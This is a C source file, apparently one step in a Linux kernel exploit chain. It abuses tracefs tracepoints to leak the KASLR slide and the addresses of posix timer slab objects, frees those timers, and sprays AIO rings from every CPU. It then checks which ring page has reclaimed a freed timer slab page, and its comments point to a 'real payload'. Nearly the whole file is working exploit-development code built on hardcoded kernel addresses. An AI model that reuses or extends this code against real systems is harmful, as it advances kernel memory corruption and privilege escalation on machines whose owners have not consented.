/*
 * tp_reclaim.c - experiment C: PFN-verified page reclaim (tracepoints only).
 *
 * Proves we can tell which AIO ring page owns a reclaimed posix_timers slab
 * page, without kprobes and without perf:
 *
 *   1. static kmem_cache_alloc tracepoint -> k_itimer addresses
 *      (call_site == alloc_posix_timer + slide, bytes_req == 0x180, our pid)
 *   2. mm_page_free / mm_page_alloc text events -> pfn of slab pages
 *   3. filemap:mm_filemap_add_to_page_cache text events -> pfn of each ring
 *      page at io_setup() time, in io_setup() order per CPU
 *
 * Rings are sprayed from one thread per CPU (like a real payload must), so
 * the Nth filemap line of CPU c belongs to ring c/N. A watch pfn that shows
 * up there means that ring owns a page of one of our timer slabs.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define ENCACHE TRACE "/events/kmem/kmem_cache_alloc/enable"

#define PAGE_OFFSET 0xffffff8000000000ULL
#define TIMER_LINK 0xffffffc0803a726cULL
#define KITIMER_NODE 0xe0
#define ALIGN_MASK 0x1fffffULL
#define MAXT 1600
#define MAXCPU 16
#define PERCPU_RINGS 1200

static int wf(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0) return -errno;
	ssize_t n = write(fd, s, strlen(s));
	int e = errno;
	close(fd);
	return n < 0 ? -e : 0;
}

static int trigger(const char *s)
{
	int r = wf(TRIGGER, s);
	if (r == 0 || r == -EEXIST) return 0;
	return r;
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static int trace_off_on(void)
{
	int fd;
	if (wf(TRACE "/tracing_on", "0\n")) return -1;
	fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
	if (fd < 0) return -1;
	close(fd);
	if (wf(TRACE "/tracing_on", "1\n")) return -1;
	return 0;
}

static int read_raw(unsigned char *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
		      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	int budget = 300;
	*used = 0;
	if (fd < 0) return -errno;
	while (budget-- > 0 && *used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n > 0) { *used += (size_t)n; budget = 300; continue; }
		if (n == 0) break;
		if (errno != EAGAIN && errno != EINTR) { close(fd); return -1; }
		usleep(1000);
	}
	close(fd);
	return 0;
}

static int g_my_pid;

/* kmem_cache_alloc raw record (relative to call_site): ptr +8, bytes_req +24 */
static int scan_ptr(unsigned char *buf, size_t used, unsigned long req,
		    unsigned long long link, unsigned long long *out, int max)
{
	int n = 0;
	for (size_t i = 4; i + 32 <= used; i++) {
		unsigned long long site, ptr, br;
		int pid;
		memcpy(&site, buf + i, 8);
		if (site != link) continue;
		memcpy(&pid, buf + i - 4, 4);
		if (pid != g_my_pid) continue;
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&br, buf + i + 24, 8);
		if (br != req) continue;
		if ((ptr >> 48) != 0xffff) continue;
		if (n < max) out[n++] = ptr;
	}
	return n;
}

static unsigned long long g_watch[2 * MAXT + 8];
static int g_nwatch;
static unsigned long long g_node_watch[MAXT + 8];
static int g_nnode;

static int cmp_u64(const void *a, const void *b)
{
	unsigned long long x = *(const unsigned long long *)a;
	unsigned long long y = *(const unsigned long long *)b;
	return (x > y) - (x < y);
}

static int has_u64(const unsigned long long *arr, int n, unsigned long long v)
{
	int lo = 0, hi = n - 1;
	while (lo <= hi) {
		int mid = (lo + hi) / 2;
		if (arr[mid] == v) return 1;
		if (arr[mid] < v) lo = mid + 1;
		else hi = mid - 1;
	}
	return 0;
}

static unsigned long long object_pfn(unsigned long long ptr)
{
	return ((ptr & ~0xfffULL) - PAGE_OFFSET) >> 12;
}

static unsigned long long *g_ctx[MAXCPU];
static int g_rings[MAXCPU];
static int g_ncpu;
static volatile int g_spray_go;

static void *spray_thread(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	pin_cpu(cpu);
	g_ctx[cpu] = calloc(PERCPU_RINGS, sizeof(unsigned long long));
	g_rings[cpu] = 0;
	while (!g_spray_go) usleep(1000);
	for (int i = 0; i < PERCPU_RINGS; i++) {
		unsigned long long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx) != 0)
			break;
		g_ctx[cpu][g_rings[cpu]++] = ctx;
		if ((g_rings[cpu] & 15) == 0) usleep(200000);
	}
	return NULL;
}

static unsigned long long line_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	unsigned long long v;
	if (!p) return ~0ULL;
	v = strtoull(p + 6, &end, 16);
	return end == p + 6 ? ~0ULL : v;
}

struct cpu_stat {
	int seen, watch_hits, node_hits, hit_index;
	unsigned long long hit_pfn;
};

static void scan_text_cpu(int cpu, struct cpu_stat *st)
{
	char path[160];
	char line[1400];
	FILE *f;
	int idx = 0;
	snprintf(path, sizeof path, TRACE "/per_cpu/cpu%d/trace", cpu);
	f = fopen(path, "r");
	if (!f) return;
	while (fgets(line, sizeof line, f)) {
		if (strstr(line, "mm_filemap_add_to_page_cache:") &&
		    strstr(line, "tp_reclaim")) {
			unsigned long long pfn = line_pfn(line);
			if (pfn != ~0ULL && has_u64(g_watch, g_nwatch, pfn)) {
				int node = has_u64(g_node_watch, g_nnode, pfn);
				if (st->watch_hits == 0) {
					st->hit_index = idx;
					st->hit_pfn = pfn;
				}
				st->watch_hits++;
				if (node) st->node_hits++;
			}
			st->seen++;
			idx++;
		}
	}
	fclose(f);
}

int main(void)
{
	static unsigned char raw[8 << 20];
	size_t used;
	unsigned long long slide = 0;
	static timer_t ids[MAXT];
	int ntimers = 0;
	static unsigned long long addrs[MAXT];
	int naddr = 0;

	g_my_pid = getpid();
	pin_cpu(0);
	g_ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (g_ncpu > MAXCPU) g_ncpu = MAXCPU;

	/* ---- 1. slide --------------------------------------------------- */
	trigger("!enable_event:kmem:kmem_cache_alloc");
	trigger("enable_event:kmem:kmem_cache_alloc");
	for (int round = 0; round < 12 && !slide; round++) {
		struct sigevent ev;
		timer_t id;
		memset(&ev, 0, sizeof ev);
		ev.sigev_notify = SIGEV_NONE;
		if (trace_off_on()) { printf("TRACE_FAIL\n"); return 1; }
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0)
			timer_delete(id);
		wf(TRACE "/tracing_on", "0\n");
		if (read_raw(raw, sizeof raw, &used)) { printf("READ_FAIL\n"); return 1; }
		for (size_t i = 4; i + 32 <= used; i++) {
			unsigned long long site, br, s;
			memcpy(&site, raw + i, 8);
			if ((site >> 48) != 0xffff) continue;
			memcpy(&br, raw + i + 24, 8);
			if (br != 0x180) continue;
			s = site - TIMER_LINK;
			if (s > 0 && s < 0x10000000000ULL && (s & ALIGN_MASK) == 0) {
				slide = s;
				break;
			}
		}
	}
	if (!slide) { printf("NO_SLIDE\n"); return 1; }
	printf("SLIDE 0x%llx\n", slide);

	/* ---- 2. collect k_itimer addresses ------------------------------ */
	for (int batch = 0; batch < 64 && ntimers + 48 <= MAXT; batch++) {
		struct sigevent ev;
		int made = 0;
		memset(&ev, 0, sizeof ev);
		ev.sigev_notify = SIGEV_NONE;
		if (trace_off_on()) break;
		for (int i = 0; i < 48; i++) {
			timer_t id;
			if (timer_create(CLOCK_MONOTONIC, &ev, &id) == 0) {
				ids[ntimers++] = id;
				made++;
			}
		}
		wf(TRACE "/tracing_on", "0\n");
		if (read_raw(raw, sizeof raw, &used)) break;
		{
			unsigned long long tmp[128];
			int n = scan_ptr(raw, used, 0x180, TIMER_LINK + slide, tmp, 128);
			for (int i = 0; i < n && naddr < MAXT; i++)
				addrs[naddr++] = tmp[i];
		}
		if (!made) break;
	}
	printf("TIMERS created=%d addrs=%d\n", ntimers, naddr);
	if (naddr < 32) { printf("TOO_FEW_ADDRS\n"); return 1; }

	/* ---- 3. watch sets ---------------------------------------------- */
	g_nwatch = 0;
	g_nnode = 0;
	for (int i = 0; i < naddr; i++) {
		unsigned long long node = object_pfn(addrs[i] + KITIMER_NODE);
		g_node_watch[g_nnode++] = node;
		g_watch[g_nwatch++] = node;
		g_watch[g_nwatch++] = object_pfn(addrs[i]) & ~1ULL;
	}
	qsort(g_watch, g_nwatch, sizeof(g_watch[0]), cmp_u64);
	{
		int w = 0;
		for (int i = 0; i < g_nwatch; i++)
			if (w == 0 || g_watch[w - 1] != g_watch[i])
				g_watch[w++] = g_watch[i];
		g_nwatch = w;
	}
	qsort(g_node_watch, g_nnode, sizeof(g_node_watch[0]), cmp_u64);
	{
		int w = 0;
		for (int i = 0; i < g_nnode; i++)
			if (w == 0 || g_node_watch[w - 1] != g_node_watch[i])
				g_node_watch[w++] = g_node_watch[i];
		g_nnode = w;
	}
	printf("WATCH %d node_watch=%d\n", g_nwatch, g_nnode);

	/* ---- 4. delete timers, spray per CPU, capture events ------------- */
	trigger("!enable_event:kmem:kmem_cache_alloc");
	trigger("enable_event:kmem:mm_page_free");
	trigger("enable_event:kmem:mm_page_alloc");
	trigger("enable_event:filemap:mm_filemap_add_to_page_cache");
	wf(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n");

	if (wf(TRACE "/tracing_on", "0\n")) return 1;
	{
		int fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
		if (fd >= 0) close(fd);
	}
	if (wf(TRACE "/tracing_on", "1\n")) return 1;

	pthread_t th[MAXCPU];
	int nth = 0;
	g_spray_go = 0;
	for (int c = 0; c < g_ncpu; c++)
		if (pthread_create(&th[nth++], NULL, spray_thread, (void *)(intptr_t)c) != 0)
			break;
	g_spray_go = 1;
	usleep(100000);
	for (int i = 0; i < ntimers; i++)
		timer_delete(ids[i]);
	for (int i = 0; i < nth; i++)
		pthread_join(th[i], NULL);
	wf(TRACE "/tracing_on", "0\n");
	{
		int rings = 0;
		for (int c = 0; c < g_ncpu; c++) rings += g_rings[c];
		printf("RINGS %d\n", rings);
	}

	/* ---- 5. parse text traces --------------------------------------- */
	int total_seen = 0, total_watch = 0, total_node = 0;
	int hit_cpu = -1, hit_idx = -1;
	unsigned long long hit_pfn = 0;
	int free_hits = 0, alloc_hits = 0, order1_frees = 0;
	for (int c = 0; c < g_ncpu; c++) {
		struct cpu_stat st;
		char path[160];
		FILE *f;
		memset(&st, 0, sizeof st);
		scan_text_cpu(c, &st);
		total_seen += st.seen;
		total_watch += st.watch_hits;
		total_node += st.node_hits;
		printf("CPU%d rings=%d seen=%d watch=%d node=%d\n",
		       c, g_rings[c], st.seen, st.watch_hits, st.node_hits);
		if (hit_cpu < 0 && st.watch_hits > 0 &&
		    g_rings[c] > 0 && st.seen == g_rings[c]) {
			hit_cpu = c;
			hit_idx = st.hit_index;
			hit_pfn = st.hit_pfn;
		}
		/* page free/alloc counters */
		snprintf(path, sizeof path, TRACE "/per_cpu/cpu%d/trace", c);
		f = fopen(path, "r");
		if (!f) continue;
		{
			char line[1400];
			while (fgets(line, sizeof line, f)) {
				unsigned long long pfn;
				if (strstr(line, "mm_page_free:")) {
					pfn = line_pfn(line);
					if (strstr(line, "order=1")) order1_frees++;
					if (pfn != ~0ULL && has_u64(g_watch, g_nwatch, pfn))
						free_hits++;
				} else if (strstr(line, "mm_page_alloc:")) {
					pfn = line_pfn(line);
					if (pfn != ~0ULL && has_u64(g_watch, g_nwatch, pfn))
						alloc_hits++;
				}
			}
		}
		fclose(f);
	}
	printf("FILEMAP seen=%d watch_hits=%d node_hits=%d free=%d alloc=%d order1=%d\n",
	       total_seen, total_watch, total_node, free_hits, alloc_hits,
	       order1_frees);

	if (hit_cpu >= 0) {
		unsigned long long ctx = g_ctx[hit_cpu][hit_idx];
		uint32_t magic = 0;
		int node = has_u64(g_node_watch, g_nnode, hit_pfn);
		if (ctx) memcpy(&magic, (void *)(uintptr_t)(ctx + 16), 4);
		printf("MATCH cpu=%d ring=%d ctx=0x%llx pfn=0x%llx node_page=%d magic=0x%x\n",
		       hit_cpu, hit_idx, ctx, hit_pfn, node, magic);
	} else {
		printf("MISS watch=%d node_watch=%d\n", g_nwatch, g_nnode);
	}
	trigger("!enable_event:kmem:mm_page_free");
	trigger("!enable_event:kmem:mm_page_alloc");
	trigger("!enable_event:filemap:mm_filemap_add_to_page_cache");
	printf("done\n");
	return 0;
}
